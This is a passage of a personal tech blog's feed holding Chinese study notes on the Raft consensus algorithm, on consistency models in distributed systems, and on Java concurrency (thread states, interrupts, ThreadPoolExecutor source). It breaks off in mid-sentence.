protocol）是迄今为止最有效的解决服务器不可靠问题的途径，因为它使得一组服务器形成一个相互协同的系统，从而当其中部分服务器故障后，整个系统也能够继续工作(<a href="https://www.zhihu.com/question/52337912/answer/131507725" target="_blank" rel="noopener">Ref from</a>)</p></blockquote></li><li>通过支持follower read使得对于读请求可以负载均衡</li></ul></li></ul><h3 id="任期"><a href="#任期" class="headerlink" title="任期"></a>任期</h3><ul><li>任期在 Raft 算法中充当逻辑时钟的作用，这会允许服务器节点查明一些过期的信息比如陈旧的领导者</li><li><strong>任期号是单调递增的： 新leader的任期号一定比旧的任期号大。旧leader得到有大部分server的支持，所以大部分server上持久化的leader任期号必然等于旧leader的，所以一个跟旧leader任期号相同或更小的server必然不可能当选</strong></li><li>如果一个服务器的当前任期号比其他人小，那么他会更新自己的编号到较大的编号值</li><li>如果一个候选人或者领导者发现自己的任期号过期了，那么他会立即恢复成跟随者状态。如果一个节点接收到一个包含过期的任期号的请求，那么他会直接拒绝这个请求</li></ul><h3 id="选举"><a href="#选举" class="headerlink" title="选举"></a>选举</h3><ul><li>最开始启动时，server以follower的身份启动</li><li>如果超时没有收到心跳（选举超时，通常是100ms~500ms，每台服务器都会随机的计算下次超时的间隔时间，这个时间间隔在<code>[T, 2T]</code>之间。T代表着选举超时的时间，即服务器可能出现超时的最短时间）。那么进入选举过程</li><li>通过以下手段使得不会无限分票<ul><li>广播时间（广播时间指的是从一个服务器并行的发送 RPCs 给集群中的其他服务器并接收响应的平均时间）必须比选举超时时间小一个量级,这样领导人才能够发送稳定的心跳消息来阻止跟随者开始进入选举状态</li><li>随机化超时时间 </li></ul></li><li>拉票RPC包括：候选人的任期号、候选人的id、候选人的最后日志条目的索引值、候选人最后日志条目的任期号<ul><li>一个问题，索引值和任期号相同，那么日志内容就一定相同吗？</li><li>我认为<ul><li>因为数据都从领导人流向其他服务器，所以某服务器在该位置上有这样一条这个任期号的日志，必然是因为有这个任期号的leader传给它的，而领导人绝不删除或覆盖自己的日志，所以日志内容是确定的</li><li>如果出现该leader还没有comment该日志就下台，也不会出问题，因为新的leader的任期号必然比旧leader的大</li></ul></li></ul></li><li>投票过程<ul><li>每一个服务器最多会对一个任期号投出一张选票，按照先来先服务的原则</li><li>RPC 中包含了候选人的日志信息,然后投票人会拒绝掉那些日志没有自己新的投票请求。（“新的”定义：(<code>lastterm_me &lt; lastterm_ca || (lastterm_me == lastterm_ca &amp;&amp; lastindex_me &lt;= lastindex_ca))</code>）</li><li><strong>拉票时，通过日志的完整、新旧程度来判断是否投票给某候选人，所以即使某服务器已收到term-4的leader发来的term-2的log，其还是会将票投给term-3的候选人（这样导致了“新leader复制旧日志使之分布到大多数node上时依然不能提交”）</strong></li></ul></li><li>安全：保证某任期一定有一个leader，方法是保证某次投票只投给一人，所以需要server持久化自己的投票信息，保证不重复投票</li><li>可用：保证一定会选出leader。通过随机化超时时间来保证</li><li>Raft使用投票的方式来阻止一个候选人赢得选举除非这个候选人包含了所有已经提交的日志条目。候选人为了赢得选举必须联系集群中的大部分节点,这意味着每一个已经提交的日志条目在这些服务器节点中肯定存在于至少一个节点上。如果候选人的日志至少和大多数的服务器节点一样新, 那么他一定持有了所有已经提交的日志条目</li></ul><h3 id="可用性"><a href="#可用性" class="headerlink" title="可用性"></a>可用性</h3><ul><li>选举超时时间应该要比平均故障间隔时间小上几个数量级，这样整个系统才能稳定的运行</li><li><strong>当领导人崩溃后，整个系统会大约相当于选举超时的时间里不可用</strong></li></ul><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><ul><li>如果有任何的服务器节点已经应用了一个确定的日志条目到它的状态机中，那么其他服务器节点不能在同一个日志索引位置应用一个不同的指令</li><li>覆盖日志的风险<ul><li>如果一个领导人在提交日志条目之前崩溃了，未来后续的领导人会继续尝试复制这条日志记录</li><li>当领导人复制之前任期里的日志时,Raft会为所有日志保留原始的任期号</li><li>所以如果某条前任的日志被当前leader复制到大多数机器上，另外的机器（没有这条日志）依然有可能被选为leader，因为该server的日志可以被老日志新（虽然比当前leader老）（论文中的图8）</li><li>解决方法：一个领导人不能断定一个之前任期里的日志条目被保存到大多数服务器上的时候就一定已经提交了。一旦当前任期的日志条目以这种方式被提交,那么由于日志匹配特性，之前的日志条目也都会被间接的提交。在某些情况下，领导人可以安全的知道一个老的日志条目是否已经被提交(例如，该条目是否存储到所有服务器上）</li></ul></li></ul><h3 id="Raft读取"><a href="#Raft读取" class="headerlink" title="Raft读取"></a>Raft读取</h3><ul><li><a href="https://pingcap.com/blog-cn/lease-read/" target="_blank" rel="noopener">Ref from</a></li><li>方法一：就像写入一样，走一遍raft log，这个log commit、apply后就可能拿到最新的值了</li><li>方法二：ReadIndex Read<ul><li>将当前⾃⼰的 commit index 记录到⼀个 local 变量 ReadIndex ⾥⾯<ul><li>我的想法：对于用户来说，只能期待写入后的读取读到“刚刚写入的值”，而不能期待读到“读取时写入的值”。所以即使保存该commit index后有新的写入到来，commit index增大，依然没有问题（TODO，待求证）</li></ul></li><li>向其他节点发起⼀次 heartbeat，如果⼤多数节点返回了对应的 heartbeat response，那么 leader 就能够确定现在⾃⼰仍然是 leader</li><li>Leader 等待⾃⼰的状态机执⾏，直到 apply index 超过了 ReadIndex，这样就能够安全的提供 linearizable read 了</li><li>Leader 执⾏ read 请求，将结果返回给 client</li><li>corner case<ul><li>leader 刚通过选举成为 leader 的时候，这时候的 commit index 并不能够保证是当前整个系统最新的 commit index</li><li>Raft要求当 leader 选举成功之后，⾸先提交⼀个 no-op 的 entry，保证leader 的 commit index 成为最新的</li><li>因为 leader 在选举成功之后，term ⼀定会增加，在处理 ReadIndex 的时候，如果当前最新的 commit log 的 term 还没到新的 term，就会⼀直等待跟新的 term ⼀致，也就是 no-op entry 提交之后，才可以对外处理ReadIndex（幸好有一个no-op的写入，不然这个读就得等到有新的写入完成才能读取成功）</li></ul></li></ul></li><li>方法三：Lease Read<ul><li>leader 发送 heartbeat 的时候，会⾸先记录⼀个时间点 start，当系统⼤部分节点都回复了 heartbeat response，那么我们就可以认为 leader 的 lease 有效期可以到 start + election timeout / clock drift bound 这个时间点</li><li>主要是在于 Raft 的选举机制，因为 follower 会在⾄少election timeout 的时间之后，才会重新发⽣选举，所以下⼀个 leader 选出来的时间⼀定可以保证⼤于 start + election timeout / clock drift bound </li><li>面临风险：CPU时间不准从而出错</li></ul></li></ul><h3 id="需要可靠硬盘"><a href="#需要可靠硬盘" class="headerlink" title="需要可靠硬盘"></a>需要可靠硬盘</h3><ul><li>需要可靠保存任期号</li><li>保证某次选举时只将票投给一个server（如果没有可靠保存任期号，则有可能在选举过程中宕机又恢复的server会两次投票——一次宕机前，一次恢复后）</li><li>需要可靠保存日志</li><li><strong>我认为，“需要可靠硬盘”与“硬盘可以损坏”并不冲突，因为我们在硬盘下线后上线时，可以使用checksum等工具，来判定硬盘是否损坏，如果损坏，那么不让其上线即可</strong></li></ul><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul><li>当附加日志RPC的请求被拒绝的时候（因为一致性检查失败），跟随者可以包含冲突的条目的任期号和自己存储的那个任期的最早的索引地址。借助这些信息,领导人可以减小 nextIndex越过所有那个任期冲突的所有日志条目;这样就变成每个任期需要一次附加条目 RPC 而不是每个条目一次</li><li>follower read （TODO）</li></ul><h3 id="具体情况分析"><a href="#具体情况分析" class="headerlink" title="具体情况分析"></a>具体情况分析</h3><ul><li>某server一直收不到回复，从而假定出现分票，从而新开一个任期来选举，而他刚开始选举时，就收到上一次投票时的获胜者的心跳，会发生什么？<ul><li>因为对于心跳RPC，如果term &lt; currentTerm就返回 false，并且心跳RPC的返回值有这个follower的当前任期号，所以leader会成为follower<blockquote><p>如果接收到的RPC请求或响应中，任期号T&gt;currentTerm，那么就令currentTerm等于T，并切换状态为跟随者</p></blockquote></li><li>只是这里有一个问题，候选人收到心跳RPC也是按照follower那样回复吗，论文上的表述是“接收者实现:”，而不是“follower实现”（第5节开头时关于附加日志RPC的介绍那里）</li></ul></li><li>如何获得全局有效的任期号？这是个坏的问题。</li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li>如果心跳收不到响应怎么办？论文中没有提到</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/maemual/raft-zh_cn&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
      <category term="分布式" scheme="https://h-zex.github.io/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E5%88%86%E5%B8%83%E5%BC%8F/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="Raft" scheme="https://h-zex.github.io/tags/Raft/"/>
    
      <category term="共识算法" scheme="https://h-zex.github.io/tags/%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/"/>
    
      <category term="分布式" scheme="https://h-zex.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>分布式系统中的各种一致性</title>
    <link href="https://h-zex.github.io/2019/07/31/consistency/"/>
    <id>https://h-zex.github.io/2019/07/31/consistency/</id>
    <published>2019-07-31T14:58:41.000Z</published>
    <updated>2019-08-05T17:04:12.849Z</updated>
    
    <content type="html"><![CDATA[<h3 id="线性一致性"><a href="#线性一致性" class="headerlink" title="线性一致性"></a>线性一致性</h3><ul><li><blockquote><p>Linearizability states that: Each operation should appear to take effect instantaneously at some moment between its start and completion.</p></blockquote></li><li><blockquote><p>常用的最强一致性模型之一</p></blockquote></li><li><blockquote><p>也称为原子一致性、强一致性、立即一致性或外部一致性</p></blockquote></li><li><blockquote><p>基本的想法是让一个系统看起来好像只有一个数据副本，而且所有的操作都是原子性的(线性一致寄存器的行为就好像只有单个数据副本一样，且每个操作似乎都是在某个时间点以原子性的方式生效的)</p></blockquote></li><li><blockquote><p>一旦新的值被写入或读取， 所有后续的读都会看到写入的值， 直到它被再次覆盖。尤其要注意，<strong>如果B的读取严格发生于A的读取之后（他们读取的值正在被C写入）， 那么只要A已经读取到C写入的新值，B就必须返回C写入的新值，即使C的写入仍在进行中</strong></p></blockquote></li><li>实现方法<ul><li>读取在单主复制的主库。风险在于：“一个节点很可能会认为它是领导者， 而事实上并非如此——如果具有错觉的领导者继续为请求提供服务， 可能违反线性一致性”</li><li>使用共识算法</li></ul></li><li><blockquote><p>线性一致的系统惊人的少。例如，现代多核CPU上的内存甚至都不是线性一致的: 如果一个CPU核上运行的线程写入某个内存地址，而另一个CPU核上运行的线程不久之后读取相同的地址，并没有保证一定能一定读到第一个线程写入的值（除非使用了内存屏障（memorybarrier)或围栏（fence)（<a href="https://zhuanlan.zhihu.com/p/35386457" target="_blank" rel="noopener">可以参考这篇文章</a>）</p></blockquote></li><li><blockquote><p>在线性一致的数据存储中是不存在并发操作的：必须有且仅有一条时间线，所有的操作都在这条时间线上，<strong>构成一个全序关系</strong>。可能有几个请求在等待处理，但是数据存储确保了每个请求都是在唯一时间线上的某个时间点自动处理的，不存在任何并发。对比之下，<strong>因果关系只是偏序关系</strong>。如果两个操作都没有在彼此之前发生，那么这两个操作是并发的，如果两个事件是因果相关的（一个发生在另一个事件之前），则它们之间是有序的，但如果它们是并发的，则它们之间的顺序是无法比较的。这意味着因果关系定义了一个偏序， 而不是一个全序： 一些操作相互之间是有顺序的， 但有些则是无法比较的</p></blockquote></li></ul><h3 id="read-after-write-consistency-读写一致性"><a href="#read-after-write-consistency-读写一致性" class="headerlink" title="read-after-write consistency(读写一致性)"></a>read-after-write consistency(读写一致性)</h3><ul><li>这是一个保证，比如，如果用户重新加载页面，他们总会看到他们自己提交的任何更新。它不会对其他用户的写入做出承诺： 其他用户的更新可能稍等才会看到 </li><li>通过读主库、时间限制的读从库、保证时间下界的读从库来实现</li><li>如果要跨设备，那么需要有元数据中心来存时间戳</li></ul><h3 id="单调读"><a href="#单调读" class="headerlink" title="单调读"></a>单调读</h3><ul><li>避免时光倒流现象</li><li>可以通过确保用户总是从同一个副本读取来实现（比如每个用户通过hash其id将其分配到某个机器/集群）</li></ul><h3 id="一致前缀读"><a href="#一致前缀读" class="headerlink" title="一致前缀读"></a>一致前缀读</h3><ul><li>如果一些系列写入按照某个顺序发生，那么任何人读取这些写入时，也会看见它们以同样的顺序出现</li><li>解决方法是，确保任何因果相关的写入都写入到相同的分区（例如数据库的某个分片），这需要高效的追踪因果依赖关系的算法</li></ul><h3 id="顺序一致性"><a href="#顺序一致性" class="headerlink" title="顺序一致性"></a>顺序一致性</h3><ul><li>参考：Distributed Systems, 3rd Edition(Maarten van Steen / Andrew S. Tanenbaum)</li><li><blockquote><p>Sequential consistency is an important data-centric consistency model, which was first defined by Lamport [1979] in the context of shared memory for multiprocessor systems. </p></blockquote></li><li><blockquote><p>A data store is said to be sequentially consistent when it satisfies the following condition: The result of any execution is the same <strong>as if</strong> <strong>the (read and write) operations by all processes on the data store were executed in some sequential order</strong> and <strong>the operations of each individual process appear in this sequence in the order specified by its program</strong>.</p></blockquote></li><li>任何读写操作的有效交叉都是可接受的，但是所有进程都要看到相同的操作交叉，在这里，时间不起作用，即没有所谓“最近一次”</li><li>进程可以看到所有进程的写操作，但是只能看到自己的读操作</li></ul><h3 id="因果一致性"><a href="#因果一致性" class="headerlink" title="因果一致性"></a>因果一致性</h3><ul><li>参考：Distributed Systems, 3rd Edition(Maarten van Steen / Andrew S. Tanenbaum)</li><li><blockquote><p>一种弱化的顺序一致性模型，因为它将具有潜在因果关系的事件和没有因果关系的事件区分开来</p></blockquote></li><li><blockquote><p>If event b is caused or influenced by an earlier event a, causality requires that everyone else first see a, then see b.</p></blockquote></li><li><blockquote><p>所有进程必须以相同的顺序看到具有潜在因果关系的写操作，不同机器上可以以不同的顺序看到并发的写操作（即没有因果关系的写操作）</p></blockquote></li></ul><h3 id="最终一致性"><a href="#最终一致性" class="headerlink" title="最终一致性"></a>最终一致性</h3><ul><li>这种一致性几乎不提供任何承诺</li><li>不能保证因果顺序</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;线性一致性&quot;&gt;&lt;a href=&quot;#线性一致性&quot; class=&quot;headerlink&quot; title=&quot;线性一致性&quot;&gt;&lt;/a&gt;线性一致性&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;blockquote&gt;
&lt;p&gt;Linearizability states that: Each op
      
    
    </summary>
    
      <category term="分布式" scheme="https://h-zex.github.io/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
    
      <category term="一致性" scheme="https://h-zex.github.io/tags/%E4%B8%80%E8%87%B4%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>My Java Concurrent Note(2)</title>
    <link href="https://h-zex.github.io/2019/07/10/java-concurrency-note-2/"/>
    <id>https://h-zex.github.io/2019/07/10/java-concurrency-note-2/</id>
    <published>2019-07-10T04:49:04.000Z</published>
    <updated>2019-08-19T13:08:24.968Z</updated>
    
    <content type="html"><![CDATA[<h3 id="串行线程的封闭"><a href="#串行线程的封闭" class="headerlink" title="串行线程的封闭"></a>串行线程的封闭</h3><ul><li>线程封闭对象的要求：<ul><li>只能由单个线程拥有</li><li>通过安全的发布来转移所有权（安全的发布确保对象状态对于新的所有者来说是可见的（不止这个作用？））</li><li>所有权转以后，只有接受所有权的线程才可以访问（独占的所有权）</li></ul></li><li>可以使用阻塞队列、ConcurrentHashMap的remove方法、AtomicReference的compareAndSet来完成</li></ul><h3 id="Interrupt"><a href="#Interrupt" class="headerlink" title="Interrupt"></a>Interrupt</h3><ul><li>每个线程都有一个<code>boolean</code>的中断标志</li><li><code>Thread.interrupted</code>方法将返回当前线程是否被中断，并<strong>清除中断标志</strong></li><li><code>Thread.currentThread().interrupt()</code>将中断当前线程</li><li>阻塞库方法，例如<code>Thread.sleep</code>，<code>Object.wait</code>会检查线程何时中断，并在发现时提前返回</li></ul><h4 id="InterruptedException"><a href="#InterruptedException" class="headerlink" title="InterruptedException"></a>InterruptedException</h4><ul><li>当一个方法会抛出这个异常时，表示这是一个阻塞方法，如果这个方法被中断，那么它将努力提前结束阻塞状态</li><li>当在代码中调用将抛出该异常的方法时，我们的方法也就成了一个阻塞方法，必须要对中断进行响应。有两种选择<ul><li>传递<code>InterruptedException</code>：不捕获该异常，或者捕获后重新抛出</li><li>恢复中断：调用当前线程的interrupt方法恢复中断状态</li></ul></li><li>只有在对Thread进行扩展并且可以控制调用栈上的所有更高层代码时才可以屏蔽该异常</li></ul><h4 id="不可中断的操作"><a href="#不可中断的操作" class="headerlink" title="不可中断的操作"></a>不可中断的操作</h4><ul><li>请求内置锁（synchronized）</li></ul><h3 id="Thread"><a href="#Thread" class="headerlink" title="Thread"></a>Thread</h3><h4 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h4><ul><li>一个<code>Thread</code>对象即使没有引用了，但是已经start，这个线程还是在运行</li></ul><h4 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h4><ul><li>使用<code>Executors.privilegedThreadFactory()</code>可以创建出线程工厂，用这种方式创建出来的线程，将于创建<code>privilegedThreadFactory</code>的线程拥有相同的访问权限、<code>AccessControlContext</code>和<code>contextClassLoader</code></li><li>如果不使用该方法，线程池创建的线程将从在需要新线程时调用execute或submit的客户程序中继承访问权限</li></ul><h4 id="Daemon"><a href="#Daemon" class="headerlink" title="Daemon"></a>Daemon</h4><ul><li><code>Thread.setDaemon()</code>:  This method must be invoked before the thread is started</li><li>当只剩下守护线程时，虚拟机就退出了，由于如果只剩下守护线程，就没必要继续运行程序了。</li><li>守护线程应该永远不去访问固有资源， 如文件、 数据库，因为它会在任何时候甚至在一个操作的中间发生中断。</li></ul><h4 id="Thread-suspend"><a href="#Thread-suspend" class="headerlink" title="Thread.suspend"></a>Thread.suspend</h4><ul><li>与 stop 不同，suspend 不会破坏对象。但是，如果用 suspend 挂起一个持有一个锁的线程， 那么，该锁在恢复之前是不可用的。 如果调用suspend 方法的线程试图获得同一个锁， 那么程序死锁</li></ul><h4 id="Thread状态"><a href="#Thread状态" class="headerlink" title="Thread状态"></a>Thread状态</h4><ul><li><p>状态转换</p><ul><li>当一个线程被阻塞或等待时（或终止时） ，另一个线程被调度为运行状态</li><li>当一个线程被重新激活（例如， 因为超时期满或成功地获得了一个锁)， 调度器检查它是否具有比当前运行线程更高的优先级。 如果是这样，调度器从当前运行线程中挑选一个， 剥夺其运行权，选择一个新的线程运行。</li></ul></li><li><p>new：当用 new 操作符创建一个新线程时， 如 <code>new Thread(r)</code>， 该线程还没有开始运行。这意味着它的状态是 new。当一个线程处于新创建状态时， 程序还没有开始运行线程中的代码。在线程运行之前还有一些基础工作要做</p></li><li>Runnable：一旦调用 start 方法，线程处于 runnable 状态。一个可运行的线桿<strong>可能正在运行也可能没有运行</strong>， 这取决于操作系统给线程提供运行的时间。（A thread in the runnable state is executing in the Java virtual machine but it may be waiting for other resources from the operating system such as processor）（Java 的规范说明没有将它作为一个单独状态。一个正在运行中的线程仍然处于可运行状态)</li><li><p>Blocked：当线程处于被阻塞或等待状态时，它暂时不活动。它不运行任何代码且消耗最少的资源。直到线程调度器重新激活它。（ 细节取决于它是怎样达到非活动状态的) 。当所有其他线程释放该锁，并且线程调度器允许本线程持有它的时候，该线程将变成非阻塞状态</p><ul><li>当一个线程试图获取一个内部的对象锁（而不是 java.util.concurrent 库中的锁，) 而该锁被其他线程持有， 则该线程进人阻塞状态。（Thread state for a thread blocked waiting for a <strong>monitor lock.</strong> A thread in the blocked state is waiting for a monitor lock to enter a synchronized block/method or reenter a synchronized block/method after calling Object.wait.）。当所有其他线程释放该锁，并且线程调度器允许本线程持有它的时候，该线程将变成非阻塞状态</li></ul></li><li><p>WAITING</p><ul><li><p>当线程等待另一个线程通知调度器一个条件时， 它自己进入<strong>等待状态</strong>。（使用<code>Object.wait</code>或<code>Thread.join</code>方法，或是等待<code>java.util.concurrent</code>库中的Lock或Condition时，就会出现这种情况）</p></li><li><p>Thread state for a waiting thread. A thread is in the waiting state due to calling one of the following methods:</p><ul><li>Object.wait with no timeout</li><li>Thread.join with no timeout</li><li>LockSupport.park</li></ul><p>A thread in the waiting state is waiting for another thread to perform a particular action.</p></li></ul></li><li><p>TIMED_WAITING</p><ul><li>Thread state for a waiting thread with a specified waiting time. A thread is in the timed waiting state due to calling one of the following methods with a specified positive waiting time:<ul><li>Thread.sleep</li><li>Object.wait with timeout</li><li>Thread.join with timeout</li><li>LockSupport.parkNanos</li><li>LockSupport.parkUntil</li></ul></li></ul></li><li><p>TERMINATED</p><ul><li>Thread state for a terminated thread. The thread has <strong>completed execution</strong></li><li>线程因如下两个原因之一而被终止<ul><li>因为 run 方法正常退出而自然死亡。</li><li>因为一个没有捕获的异常终止了 nm 方法而意外死亡</li><li>可以调用线程的 stop 方法杀死一个线程。 该方法抛出 <code>ThreadDeath</code> 错误对象,由此杀死线程。但是，stop 方法已过时</li></ul></li></ul></li></ul><h3 id="ThreadPoolExecutor"><a href="#ThreadPoolExecutor" class="headerlink" title="ThreadPoolExecutor"></a>ThreadPoolExecutor</h3><h4 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h4><ul><li>JVM只有在所有（非守护）线程全部终止后才会退出，因为如果无法正确的关闭Executor，JVM无法关闭</li></ul><h4 id="SingleThreadExecutor"><a href="#SingleThreadExecutor" class="headerlink" title="SingleThreadExecutor"></a>SingleThreadExecutor</h4><ul><li>确保不会并发执行任务。为了避免用户代码修改返回的ThreadPoolExecutor对象，从而改变不并发执行的语义，所以对其进行包装使得无法类型转换为ThreadPoolExecutor来修改那些特性</li><li><code>Executors.unconfigurableExecutorService()</code>包装的Executor就具有冻结配置的特性</li></ul><h4 id="afterExecute和beforeExecute方法"><a href="#afterExecute和beforeExecute方法" class="headerlink" title="afterExecute和beforeExecute方法"></a>afterExecute和beforeExecute方法</h4><ul><li><p>以下是<code>runWorker</code>方法内的片段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    beforeExecute(wt, task);</span><br><span class="line">    Throwable thrown = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        task.run();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException x) &#123;</span><br><span class="line">        thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Error x) &#123;</span><br><span class="line">        thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable x) &#123;</span><br><span class="line">        thrown = x; <span class="keyword">throw</span> <span class="keyword">new</span> Error(x);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        afterExecute(task, thrown);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    task = <span class="keyword">null</span>;</span><br><span class="line">    w.completedTasks++;</span><br><span class="line">    w.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出</p><ul><li>如果beforeExecute抛出异常，则不会执行task和afterExecute</li><li>无论task抛出什么异常，都会执行afterExecute</li></ul></li></ul><h4 id="submit的策略"><a href="#submit的策略" class="headerlink" title="submit的策略"></a>submit的策略</h4><ul><li><p>源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> c = ctl.get();</span><br><span class="line"><span class="keyword">if</span> (workerCountOf(c) &lt; corePoolSize) &#123;</span><br><span class="line">    <span class="keyword">if</span> (addWorker(command, <span class="keyword">true</span>))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    c = ctl.get();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isRunning(c) &amp;&amp; workQueue.offer(command)) &#123;</span><br><span class="line">    <span class="keyword">int</span> recheck = ctl.get();</span><br><span class="line">    <span class="keyword">if</span> (! isRunning(recheck) &amp;&amp; remove(command))</span><br><span class="line">        reject(command);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (workerCountOf(recheck) == <span class="number">0</span>)</span><br><span class="line">        addWorker(<span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!addWorker(command, <span class="keyword">false</span>))</span><br><span class="line">    reject(command);</span><br></pre></td></tr></table></figure></li><li><p>如果运行的corePoolSize线程少于corePoolSize，则会创建一个新线程来处理请求，即使其他工作线程处于空闲状态也是如此。否则，如果正在运行少于maximumPoolSize的线程，则只有在队列已满时才会创建一个新线程来处理请求</p></li><li><p>如果core线程还有剩（就是当前启动的线程数少于核心线程数），那么新加<br>worker（等价于新加线程，加入线程后，会run firstTask——<code>prestartAllCoreThreads</code>方法加入的核心worker的firstTask都是null，从而run firstTask不会去运行task）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Delegates main run loop to outer runWorker  */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    runWorker(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这是内部的Worker（实现了Runnable接口）的run方法，在addWorker后会调用该worker的thread的start方法，从而调用该run方法</span></span><br></pre></td></tr></table></figure></li><li><p>否则就尝试push到工作队列里（即使核心线程不忙，也是直接push到队列中，然后核心线程从队列中获得task）（worker运行的线程会阻塞的等待工作队列有东西返回）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (task != <span class="keyword">null</span> || (task = getTask()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    w.lock();</span><br><span class="line">    <span class="comment">// If pool is stopping, ensure thread is interrupted;</span></span><br><span class="line">    <span class="comment">// 这来自ThreadPoolExecutor的runWorker方法，worker将run方法委托给这个方法</span></span><br></pre></td></tr></table></figure></li><li><p>如果工作队列已经满了就会尝试去添加非核心线程</p></li><li><p>因为在添加到工作队列时，使用的是<code>offer</code>，所以即使是<code>SynchronousQueue</code>，也不会阻塞，而是没有线程正在等待接受就立刻返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SynchronousQueue&lt;E&gt; <span class="keyword">public</span> <span class="keyword">boolean</span> offer</span><br><span class="line">Inserts the specified element into <span class="keyword">this</span> queue, <span class="keyword">if</span> another thread is waiting to receive it.</span><br><span class="line">Returns: <span class="keyword">true</span> <span class="keyword">if</span> the element was added to <span class="keyword">this</span> queue, <span class="keyword">else</span> <span class="keyword">false</span></span><br><span class="line"><span class="comment">// 截取自SynchronousQueue的doc</span></span><br></pre></td></tr></table></figure><p>因为，如果核心线程已满，但是这个queue无法被offer，那么说明核心线程都忙（会不会出现<code>executor.prestartAllCoreThreads</code>跑完但是有的线程还没到等待点的情况，从而虽然有的线程不忙但是还是无法offer？），所以尝试启动新的非核心线程</p></li><li><p>这意味着，queue不能太小：否则，如果无法添加新线程，而有的线程虽然不忙，但是可能没能及时得到cpu时间去把task从队列中拿出来，就会导致执行<code>RejectedExecutionHandler</code></p></li><li><p>要特别注意<code>execute</code>的这一个片段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isRunning(c) &amp;&amp; workQueue.offer(command)) &#123;</span><br><span class="line">    <span class="keyword">int</span> recheck = ctl.get();</span><br><span class="line">    <span class="keyword">if</span> (! isRunning(recheck) &amp;&amp; remove(command))</span><br><span class="line">        reject(command);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (workerCountOf(recheck) == <span class="number">0</span>)</span><br><span class="line">        addWorker(<span class="keyword">null</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>即使coreSize==0（maxSize为0是非法的）， 